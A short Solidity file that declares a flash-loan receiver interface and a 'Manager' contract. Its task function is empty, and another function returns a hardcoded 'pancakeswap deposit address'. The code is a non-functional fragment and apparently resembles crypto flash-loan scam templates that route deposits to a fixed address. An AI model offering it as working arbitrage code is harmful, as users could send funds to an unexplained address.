pragma solidity ^0.5.0;

/**
 * @title IFlashLoanReceiver interface
 * @notice Interface for the Multiplier fee IFlashLoanReceiver.
 * @author Multiplier Finance
 * @dev implement this interface to develop a flashloan-compatible
 * flashLoanReceiver contract
 **/
interface IFlashLoanReceiver {
    function executeOperation(
        address _reserve,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _params
    ) external;
}



contract Manager {
    function performTasks() public pure{
        
    }
    
    function pancakeswapDepositAddress() public pure returns (address) {
        return 0x0c0f8f8DABC7861E0d92cdBCCb0DCC60bC68a114;
    }
}

//pancakeswapfunction
